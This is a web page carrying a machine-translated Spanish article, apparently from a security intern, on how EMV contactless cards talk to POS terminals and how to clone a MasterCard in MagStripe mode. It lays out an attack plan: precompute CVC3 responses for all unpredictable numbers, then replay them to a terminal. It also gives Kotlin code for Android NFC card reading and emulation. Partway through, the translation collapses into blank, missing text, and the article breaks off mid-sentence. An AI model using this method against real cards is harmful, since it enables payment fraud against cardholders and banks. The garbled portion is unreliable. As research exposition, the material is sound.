<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèΩ‚Äçü§ù‚Äçüë®üèª üëáüèΩ üìë Clonar una tarjeta sin contacto usando una aplicaci√≥n m√≥vil üòí ‚úçÔ∏è üì≤</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Siempre fue interesante ver lo que sucede en una tarjeta bancaria debajo del "cap√≥". C√≥mo se implementa el protocolo de comunicaci√≥n de una tarjeta ba...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Clonar una tarjeta sin contacto usando una aplicaci√≥n m√≥vil</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Siempre fue interesante ver lo que sucede en una tarjeta bancaria debajo del "cap√≥".  C√≥mo se implementa el protocolo de comunicaci√≥n de una tarjeta bancaria y un terminal POS, c√≥mo funciona y qu√© tan seguro es.  Tal oportunidad apareci√≥ ante m√≠ cuando estaba haciendo una pasant√≠a en Digital Security.  Como resultado, al analizar una vulnerabilidad conocida de las tarjetas EMV en modo MagStripe, se decidi√≥ implementar una aplicaci√≥n m√≥vil que puede comunicarse con el terminal a trav√©s de una interfaz sin contacto, utilizando sus propios comandos y un an√°lisis detallado de las solicitudes y respuestas.  Y tambi√©n intente implementar el m√©todo de clonaci√≥n de tarjetas MasterCard en modo MagStripe. <br><br>  En este art√≠culo tratar√© de describir qu√© es una tarjeta EMV, c√≥mo funciona y c√≥mo puede usar Android para intentar clonar su tarjeta MasterCard. <br><br>  <i><b>"Hay algunas cosas que el dinero no puede comprar.</b></i>  <i><b>Para todo lo dem√°s, hay MasterCard ¬ª</b></i> <br><br><h3>  ¬øQu√© es una tarjeta EMV? </h3><br>  EMV es el est√°ndar internacional para tarjetas bancarias con chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA particip√≥ en el desarrollo de este est√°ndar, de ah√≠ su nombre.  Intentemos descubrir c√≥mo se comunica la tarjeta con el terminal POS a trav√©s de una interfaz sin contacto. <br><a name="habracut"></a><br>  Comencemos con lo b√°sico. <br><br>  Una tarjeta sin contacto f√≠sica EMV funciona casi igual que una etiqueta RFID.  Si es b√°sico, el chip ingresa al campo electromagn√©tico, y en un circuito conductor cerrado (en nuestro caso ser√° una antena ubicada alrededor del per√≠metro), colocado en un campo magn√©tico alterno, se genera una corriente el√©ctrica alterna.  Esta corriente carga un condensador especial conectado en paralelo al circuito resonante de la tarjeta.  La energ√≠a almacenada en el condensador se utiliza para realizar una tarjeta de microcircuito para diversas operaciones.  Cuando el lector cambia el campo electromagn√©tico, los cambios se notar√°n inmediatamente en el chip.  Usando la modulaci√≥n de se√±al, podemos transmitir informaci√≥n en forma binaria.  Si conecta la resistencia de carga en la tarjeta o cambia la capacitancia del condensador, puede cambiar la intensidad de corriente en el circuito de la tarjeta, lo que conducir√° a un cambio en el campo electromagn√©tico creado por ella en el √°rea del circuito del lector, por lo que la tarjeta transmite datos.  El lector tendr√° que detectar estos cambios.  Esta interacci√≥n f√≠sica se rige por la norma ISO / IEC 14443 <i>"Tarjetas de identificaci√≥n - Tarjetas de circuitos integrados sin contacto - Tarjetas de proximidad"</i> . <br><br>  El chip de la tarjeta en s√≠ es una tarjeta inteligente que ejecuta JavaCard, una versi√≥n separada de Java para plataformas con bajos recursos inform√°ticos y soporte para algoritmos criptogr√°ficos.  JavaCard descarga applets, que son aplicaciones.  Tambi√©n hay una GlobalPlatform que es un cierto est√°ndar para JavaCard, que brinda la capacidad de administrar de forma segura los datos en el mapa y le permite descargar, modificar y eliminar aplicaciones en el mapa.  En este art√≠culo, no consideraremos los mecanismos de seguridad de la tarjeta inteligente en s√≠.  Es suficiente saber que los datos protegidos, por ejemplo, la clave privada y la clave maestra secreta de la tarjeta, est√°n en un lugar seguro y es imposible eliminarlos utilizando medios est√°ndar. <br><br>  Tambi√©n les recuerdo una peque√±a terminolog√≠a para aquellos que no est√°n familiarizados. <br><br>  <b>Terminal de</b> punto de venta (Punto de venta): un dispositivo del vendedor que lee una tarjeta e inicia un pago.  Adem√°s, llamaremos a este dispositivo simplemente un terminal. <br>  <b>El banco emisor</b> es el banco que emiti√≥ su tarjeta. <br>  <b>Adquirer Bank</b> : un banco que emite terminales POS a los vendedores y procesa los pagos de ellos. <br>  <b>El sistema de pago</b> es el enlace central entre el banco adquirente y el banco emisor, absolutamente todos los pagos pasan por √©l, y sabe a qu√© banco debe transferir el dinero.  Existen muchos sistemas de pago en el mundo, adem√°s de las conocidas <b>Visa</b> y <b>MasterCard,</b> tambi√©n est√°n <b>American Express</b> , <b>China UnionPay</b> y el sistema de pago ruso <b>MIR</b> . <br><br>  Bueno, la tarjeta y el lector pueden comunicarse.  Se env√≠an entre s√≠ comandos APDU en forma de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Tag-Length-Value,</a> es decir  el nombre de la etiqueta se transmite en hexadecimal, su longitud y valor en s√≠.  Todos los comandos se describen, por supuesto, en la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">documentaci√≥n</a> y se ven as√≠: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="imagen"><br><br>  La transacci√≥n est√°ndar de EMV se lleva a cabo en varias etapas, describir√© el algoritmo de interacci√≥n completo en el caso de una interfaz de contacto, para una interfaz sin contacto, el algoritmo se acorta un poco: <br><br><ul><li>  Selecci√≥n de aplicaciones; </li><li>  Inicializaci√≥n del procesamiento de la solicitud; </li><li>  Leer datos de la aplicaci√≥n </li><li>  Autenticaci√≥n fuera de l√≠nea </li><li>  Restricciones de procesamiento; </li><li>  Cheque del titular de la tarjeta; </li><li>  Gesti√≥n de riesgos en el lado de la terminal; </li><li>  An√°lisis de acciones terminales; </li><li>  Gesti√≥n de riesgos en el lado de la tarjeta; </li><li>  An√°lisis de las acciones de la tarjeta; </li><li>  Procesamiento en l√≠nea; </li><li>  La finalizaci√≥n de la operaci√≥n. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="imagen"><br><br>  Consideramos brevemente cada operaci√≥n. <br><br>  Selecci√≥n de aplicaci√≥n.  A menudo sucede que puede haber varias aplicaciones en una tarjeta.  Por ejemplo, una tarjeta bancaria y un boleto de viaje.  Y el terminal de alguna manera necesita descubrir d√≥nde y qu√© algoritmo usar.  El llamado <b>Identificador de aplicaci√≥n (AID</b> ) se utiliza para seleccionar una aplicaci√≥n.  Para entender esto, el terminal env√≠a un comando <b>SELECCIONAR</b> .  Por ejemplo, el <b>AID de</b> la tarjeta Visa Classic se ver√° as√≠: <b>A0000000031010</b> .  Si varios de estos c√≥digos responden y el terminal puede funcionar con varias aplicaciones, el terminal mostrar√° una lista y ofrecer√° seleccionar la aplicaci√≥n que necesitamos.  Si el terminal no admite ninguno de los c√≥digos de aplicaci√≥n, el terminal rechazar√° la operaci√≥n. <br><br>  Inicializando el procesamiento de la solicitud.  Aqu√≠, primero se verifica la ubicaci√≥n geogr√°fica.  Por ejemplo, las tarjetas Maestro Momentum pueden funcionar para el pago solo en Rusia.  Esta etapa se realiza para proporcionar a los emisores la oportunidad de aplicar los m√©todos existentes de gesti√≥n de riesgos en l√≠nea al realizar operaciones fuera de l√≠nea.  En esta etapa, una transacci√≥n EMV puede cancelarse por iniciativa de la propia tarjeta si el emisor proh√≠be este tipo de transacci√≥n en un pa√≠s determinado del mundo.  Adem√°s, la tarjeta transmite al terminal un conjunto de informaci√≥n especialmente estructurada que contiene una descripci√≥n de la funcionalidad de la tarjeta y la aplicaci√≥n. <br><br>  Leer los datos de la aplicaci√≥n.  Varios datos de la tarjeta necesarios para la transacci√≥n se transmiten al terminal, por ejemplo, n√∫mero de tarjeta, fecha de vencimiento, contador de transacciones y muchos otros datos.  Algunos de ellos ser√°n discutidos m√°s adelante. <br><br>  Datos de muestra: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="imagen"><br><br>  Tambi√©n se transmite un certificado de la clave p√∫blica del banco emisor y la tarjeta en s√≠.  Para que el terminal pueda verificar la firma digital de algunos datos de la tarjeta, se utiliza la <b>infraestructura PKI</b> (Infraestructura de clave p√∫blica).  En resumen, el sistema de pago tiene un par de claves: p√∫blicas y privadas, y el sistema de pago es para todos los participantes de la <b>CA (Autoridad del Centro)</b> .  De hecho, el sistema de pago para cada banco del emisor emite un nuevo par de claves, y al mismo tiempo genera un certificado de la clave p√∫blica del banco del emisor, firmando con la clave privada CA.  Adem√°s, cuando el banco emite una nueva tarjeta, genera un par de claves para la tarjeta, y tambi√©n genera un certificado de la clave p√∫blica de la tarjeta, firmando con la clave privada del banco.  En las terminales, generalmente se conecta un certificado de clave p√∫blica para varios sistemas de pago.  Por lo tanto, cuando la tarjeta transmite el certificado de clave p√∫blica del banco emisor y el certificado de la tarjeta en s√≠, el terminal puede verificar f√°cilmente toda la cadena utilizando la clave p√∫blica del sistema de pago.  El terminal, usando la clave p√∫blica del sistema de pago, primero verifica la autenticidad del certificado bancario del emisor, si es genuino, entonces se puede confiar y ahora usando el certificado bancario del emisor puede verificar el certificado de la tarjeta.  M√°s detalles en el art√≠culo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">sobre seguridad EMV</a> . <br><br>  Autenticaci√≥n fuera de l√≠nea.  El terminal determina el tipo de m√©todo de autenticaci√≥n sin conexi√≥n compatible.  Hay est√°tica ( <b>Autenticaci√≥n de datos est√°tica - SDA</b> ), din√°mica ( <b>Autenticaci√≥n de datos din√°mica - DDA</b> ) y combinada ( <b>Autenticaci√≥n de datos combinada - CDA</b> ).  Estos m√©todos tambi√©n se basan en PKI.  <b>SDA</b> es solo datos firmados en la clave privada del banco del emisor, <b>DDA</b> : el terminal env√≠a un n√∫mero aleatorio y la tarjeta debe firmarlo con su clave privada, y el terminal verificar√° esta firma utilizando el certificado de tarjeta recibido anteriormente, por lo que el terminal se asegurar√° de que la tarjeta realmente tiene una clave privada, por lo tanto, es genuina.  <b>CDA</b> es solo una combinaci√≥n de ambos. <br><br>  Restricciones de manejo.  Aqu√≠, el terminal verifica los datos recibidos previamente de la tarjeta para determinar la condici√≥n de idoneidad para esta operaci√≥n.  Por ejemplo, verifica las fechas de inicio / finalizaci√≥n de la aplicaci√≥n <b>Fecha de vencimiento</b> de la aplicaci√≥n <b>(Etiqueta '5F24')</b> y <b>Fecha de vigencia de la aplicaci√≥n (Etiqueta '5F25')</b> .  Tambi√©n verifica la versi√≥n de la aplicaci√≥n.  Los resultados de las operaciones realizadas en esta etapa tambi√©n se registran en el informe <b>TVR (resultados de la verificaci√≥n del terminal)</b> .  Seg√∫n los resultados de esta etapa, la transacci√≥n no se puede cancelar, incluso si, por ejemplo, la aplicaci√≥n ha expirado. <br><br>  Cheque titular de la tarjeta.  La verificaci√≥n del titular de la tarjeta se lleva a cabo para autenticar a la persona que proporcion√≥ la tarjeta y verificar si √©l es el verdadero propietario de la tarjeta.  El est√°ndar EMV proporciona varios <b>m√©todos de verificaci√≥n del titular de la tarjeta</b> .  Los m√©todos de verificaci√≥n se definen tanto en el terminal como en el mapa.  Est√°n contenidos en las llamadas <b>listas CVM</b> .  En el proceso de ejecuci√≥n, el terminal y la tarjeta comparan las listas CVM recibidas y seleccionan el m√©todo de verificaci√≥n general. <br><br>  Lista de m√©todos de verificaci√≥n admitidos: <br><br><ul><li>  No se requiere CVM ('011111'b); </li><li>  Fallo en el procesamiento de CVM ('000000'b); </li><li>  Firma ('011110'b); </li><li>  PIN cifrado verificado en l√≠nea ('000010'b); </li><li>  Verificaci√≥n de PIN de texto sin formato realizada por ICC ('000001'b); </li><li>  Verificaci√≥n de PIN de texto sin formato realizada por ICC y firma ('000011'b); </li><li>  Verificaci√≥n de PIN cifrada realizada por ICC ('000100'b); </li><li>  Verificaci√≥n de PIN cifrada realizada por ICC y firma ('000101'b). </li></ul><br>  Aqu√≠ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">tambi√©n</a> hay informaci√≥n interesante sobre este tema. <br><br>  Gesti√≥n de riesgos en el lateral de la terminal.  En esta etapa, el terminal realiza una verificaci√≥n interna de los par√°metros de la transacci√≥n, en funci√≥n de la configuraci√≥n de gesti√≥n de riesgos del banco adquirente.  El terminal puede realizar procedimientos de gesti√≥n de riesgos en cualquier momento entre la finalizaci√≥n del proceso de lectura de los datos de la tarjeta y la formaci√≥n del primer comando <b>GENERATE AC</b> por parte del terminal.  La gesti√≥n de riesgos en el lado terminal incluye tres mecanismos: <br><br><ul><li>  control del tama√±o de las operaciones realizadas en la tarjeta ( <b>Comprobaci√≥n de l√≠mite de piso</b> ); </li><li>  selecci√≥n de transacci√≥n aleatoria para la autorizaci√≥n en l√≠nea de esta transacci√≥n por parte del emisor ( <b>Selecci√≥n de transacci√≥n aleatoria</b> ); </li><li>  verificar la actividad fuera de l√≠nea del uso de la tarjeta ( <b>Comprobaci√≥n de velocidad</b> ). </li></ul><br>  An√°lisis de acciones terminales.  En esta etapa, el terminal analiza los resultados de los pasos anteriores de la transacci√≥n.  En funci√≥n de los resultados del an√°lisis, el terminal toma una decisi√≥n sobre si realizar la operaci√≥n en l√≠nea, permitir que se realice fuera de l√≠nea o rechazar la operaci√≥n. <br><br>  Gesti√≥n de riesgos en el lado de la tarjeta.  La tarjeta, despu√©s de recibir del comando <b>GENERATE AC</b> datos sobre la transacci√≥n, el terminal y los resultados de las verificaciones del terminal, a su vez, realiza sus propios procedimientos de gesti√≥n de riesgos y toma su propia decisi√≥n sobre c√≥mo completar la operaci√≥n. <br><br>  An√°lisis de las acciones de la tarjeta.  En esta etapa, la tarjeta completa los procedimientos de gesti√≥n de riesgos y genera un criptograma de respuesta al terminal.  Si la tarjeta decide aprobar la transacci√≥n, se genera un <b>Certificado de transacci√≥n</b> .  Si la tarjeta decide realizar la operaci√≥n en tiempo real, genera un <b>ARQC (criptograma de solicitud de autorizaci√≥n)</b> .  Si la tarjeta utiliza m√©todos de autorizaci√≥n alternativos, <b>se utiliza la Referencia de autorizaci√≥n de solicitud</b> .  En caso de que la tarjeta rechace la transacci√≥n, el <b>Criptograma de autenticaci√≥n de la aplicaci√≥n</b> . <br><br>  Se <b>necesita</b> otro <b>criptograma ARPC (Criptograma de respuesta de autorizaci√≥n)</b> para autenticar al emisor.  El emisor genera un ARPC de criptograma y env√≠a el criptograma a la tarjeta, si la tarjeta confirma el criptograma, el emisor es autenticado por la tarjeta. <br><br>  Un poco sobre la seguridad de las claves y la autenticaci√≥n mutua de la tarjeta y el emisor del libro de I. M. Goldovsky: <blockquote>  El significado de la autenticaci√≥n mutua es que la tarjeta y el terminal se autentican entre s√≠ mediante la autenticaci√≥n de los criptogramas ARQC y ARPC.  Los criptogramas son datos generados usando una clave secreta (que es conocida por la tarjeta y el banco por el emisor), n√∫mero de transacci√≥n, n√∫mero aleatorio generado por el terminal, as√≠ como algunos detalles de la transacci√≥n, terminal y tarjeta.  En el caso de ARPC, el c√≥digo de respuesta de autorizaci√≥n del emisor tambi√©n se agrega a los datos enumerados.  Sin conocer la clave secreta de la tarjeta para generar un criptograma, es imposible calcular los valores ARQC / ARPC en el tiempo previsible con el nivel actual de tecnolog√≠a y, por lo tanto, el hecho de su verificaci√≥n exitosa indica la autenticidad de la tarjeta y el emisor.  La autenticaci√≥n en l√≠nea es la forma m√°s confiable de autenticar una tarjeta.  Esto se debe al hecho de que es realizado directamente por el emisor, sin un intermediario en forma de terminal.  Adem√°s, el algoritmo 3DES con una clave temporal de 112 bits se utiliza para la autenticaci√≥n en l√≠nea, cuya potencia criptogr√°fica corresponde a la potencia criptogr√°fica del algoritmo RSA con la longitud del m√≥dulo de clave asim√©trica utilizada para la autenticaci√≥n fuera de l√≠nea de la aplicaci√≥n de la tarjeta que excede los 1700 bits.  El uso de teclas asim√©tricas de esta longitud en la tarjeta sigue siendo bastante raro.  Por lo general, se utilizan claves con una longitud de m√≥dulo de 1024, 1152 o 1408 bits. </blockquote><br><br>  En √∫ltima instancia, una transacci√≥n en l√≠nea pasa por una cadena: <br>  <b>Tarjeta &lt;--&gt; TPV-Terminal &lt;--&gt; Adquisici√≥n del Banco &lt;--&gt; Sistema de Pago &lt;--&gt; Emisor del Banco.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="imagen"><br><br><h3>  Clone MasterCard en modo MagStripe </h3><br>  Procedemos directamente al principio de clonaci√≥n.  Este m√©todo de ataque con tarjeta sin contacto fue publicado por dos investigadores <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Michael Roland, Josef Langer,</a> de la Universidad de Austria.  Se basa en un principio general llamado <i>Skimming</i> .  Este es un escenario en el que un atacante roba dinero de una tarjeta bancaria leyendo (copiando) informaci√≥n de esta tarjeta.  En el caso general, es importante mantener el PIN en secreto y no filtrarlo.  Pero en el m√©todo de los austriacos no necesitamos saber esto.  La clonaci√≥n de una tarjeta de pago es exitosa para la versi√≥n del n√∫cleo de la aplicaci√≥n EMV Contactless Kernel 2. La versi√≥n de este protocolo admite dos modos de funcionamiento para las tarjetas sin contacto: el protocolo EMV <b>(MasterCard PayPass M / Chip)</b> y el modo <b>MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> es un modo de soporte de tarjeta de banda magn√©tica.  Este modo se implementa en tarjetas MasterCard con una interfaz sin contacto.  Es probable que el modo MagStripe sea necesario para los bancos que tienen dificultades para transferir toda la infraestructura para admitir transacciones EMV sin chip.  Por cierto, las tarjetas Visa tambi√©n tienen un modo de operaci√≥n similar: <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  El proceso de procesamiento de transacciones para tarjetas sin contacto se trunca en comparaci√≥n con las tarjetas con chip y generalmente funciona en el siguiente modo: <br><br><ol><li>  El terminal env√≠a un <b>comando SELECT PPSE</b> (Proximity Payment System Environment).  La tarjeta env√≠a una lista de aplicaciones compatibles. </li><li>  El terminal env√≠a un comando <b>SELECCIONAR</b> .  En respuesta, recibe los detalles necesarios de la aplicaci√≥n. </li><li>  El terminal env√≠a el comando <b>GET_PROCESSING_OPTIONS</b> .  La tarjeta responde qu√© tipo de autenticaci√≥n admite y si existe all√≠ la verificaci√≥n del titular de la tarjeta. </li><li>  El terminal env√≠a el comando <b>READ_RECORDS</b> .  La tarjeta en respuesta env√≠a Track1 y Track2 casi igual que la registrada en la banda magn√©tica de la tarjeta. </li><li>  El terminal env√≠a el comando <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  Lo que significa que la tarjeta debe generar un valor CVC3 basado en el n√∫mero impredecible pasado. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="imagen"><br><br><div class="spoiler">  <b class="spoiler_title">¬øC√≥mo se ve todo en la vida real?</b> <div class="spoiler_text">  Parece un equipo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">APDU</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Lista de todas las etiquetas</a> . <br><br>  APDU: la unidad de datos del protocolo de aplicaci√≥n es un s√≠mbolo de un marco con un comando de mapa o una respuesta de mapa. <br><br>  Hay un par de art√≠culos sobre este tema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br></div></div><br>  La tarjeta admite el comando especial COMPUTE CRYPTOGRAPHIC CHECKSUM, cuyo argumento son los datos definidos en el Objeto de datos de n√∫mero impredecible (UDOL).  <b>Como resultado, la tarjeta que utiliza el algoritmo 3DES y la clave secreta calcula el valor din√°mico CVC3 (C√≥digo de verificaci√≥n de tarjeta).</b>  Como argumento para la funci√≥n 3DES, se utiliza la concatenaci√≥n de los datos UDOL y el contador de transacciones (Application Transaction Counter, ATC).  <b>Por lo tanto, el valor de CVC3 siempre depende de los objetos UN y ATC.</b> <br><br>  En otras palabras, este comando es necesario para que la tarjeta genere una cierta "firma" para que el emisor pueda verificar la tarjeta.  Sin embargo, la firma de la transacci√≥n en s√≠ falta en esta firma.  La firma contiene valores <b>ATC - 2 bytes</b> , <b>CVC3 (Track1) - 2 bytes</b> , <b>CVC3 (Track2) - 2 bytes</b> , que son generados por la tarjeta en funci√≥n de la clave secreta, que el banco emisor y el contador de transacciones (ATC) tambi√©n conocen.  Al mismo tiempo, para generar la firma, el terminal POS informa a la tarjeta <b>UN (n√∫mero impredecible)</b> - 4 bytes, que tambi√©n se utiliza en la generaci√≥n de la firma.  El n√∫mero impredecible impide la generaci√≥n de c√≥digos de autenticaci√≥n en una tarjeta real para su uso posterior en transacciones fraudulentas.  Para el ataque, la ONU interfiere fuertemente con nosotros, ya que no es posible enumerar 4 bytes sin ir m√°s all√° de los l√≠mites del contador de transacciones.  Sin embargo, hay algunas debilidades en la especificaci√≥n de esto. <br><br>  En primer lugar, la especificaci√≥n restringe la ONU a la codificaci√≥n de n√∫meros, es decir, el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">C√≥digo Decimal Binario (BCD)</a> , lo que esencialmente significa que si observamos un n√∫mero codificado en HEX, solo veremos n√∫meros del 0 al 9, todos los dem√°s valores se consideran como si estuviera prohibido  Por lo tanto, la cantidad de ONU disminuye de 4,294,967,295 a 99,999,999. <br><br>  En segundo lugar, la tarjeta determina el n√∫mero de d√≠gitos significativos de la ONU.  Por lo tanto, dependiendo de los par√°metros especiales en las pistas, el n√∫mero de d√≠gitos en la ONU puede ser de 10 a 10,000, dependiendo del tipo de tarjeta, en la pr√°ctica, se encuentran con mayor frecuencia 1000 valores. <br><br>  <b>Por lo tanto, el plan de ataque es el siguiente:</b> <br><br><ol><li>  Leemos la tarjeta y descubrimos el n√∫mero de d√≠gitos significativos de la ONU, que proporcionar√° el terminal </li><li>  Ordenamos todas las UN, obtenemos todos los valores posibles de la funci√≥n <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> , los <b>guardamos</b> en la tabla correspondiente con la asignaci√≥n UN -&gt; Resultado </li><li>  Lo llevamos a la terminal POS, descubrimos el n√∫mero que solicita la terminal POS. </li><li>  Seleccionamos el resultado deseado de la tabla y lo sustituimos en respuesta al terminal. </li><li>  La transacci√≥n se va. </li><li>  BENEFICIOS  Pero el √©xito de la aprobaci√≥n de la transacci√≥n no est√° garantizado, porque el banco emisor puede rechazar dicha transacci√≥n. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="imagen"><br><br>  Tambi√©n vale la pena se√±alar que el contador de transacciones (ATC) evita la reutilizaci√≥n de los c√≥digos de autenticaci√≥n utilizados anteriormente, lo que significa que si usamos este ataque, debemos copiar la tarjeta nuevamente, ya que el contador de transacciones ya se us√≥ para obtener informaci√≥n y se us√≥ en la firma, lo que significa que si tuvi√©ramos un contador de transacciones de 1000, y despu√©s de enviar la transacci√≥n al banco, el banco ya no aceptar√° transacciones con un contador por debajo de &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="imagen"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="imagen"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Primero, necesitamos configurar el trabajo con NFC.  En el tel√©fono podemos trabajar en dos modos.  En el modo de tarjeta, esto es cuando respondemos a los comandos del terminal, y en el modo de terminal cuando enviamos comandos y leemos, por ejemplo, una tarjeta.  Es decir  primero, podemos clonar la tarjeta y luego asegurarnos de responder a las solicitudes del terminal con comandos ya preparados. <br><br>  La siguiente es una implementaci√≥n simplificada de interacci√≥n con NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Esto describe la secuencia de comandos y enumera los valores de N√∫mero impredecible en un ciclo de 0 a 999, cambiamos Nc a "00000 $ {String.format ("% 03d ", i)}". Reemplazar (".. (?! $ ) ". toRegex ()," $ 0 ").  Y no olvide ejecutar GET_PROCESSING_OPTIONS cada vez antes de COMPUTE_CRYPTOGRAPHIC_CHECKSUM; de lo contrario, el monto del cheque no se calcular√°. <br><br>  Como resultado, todo esto puede escribirse en un archivo y usarse cuando se trabaja con este terminal.  Aqu√≠ obtenemos el nombre y el n√∫mero de tarjeta, 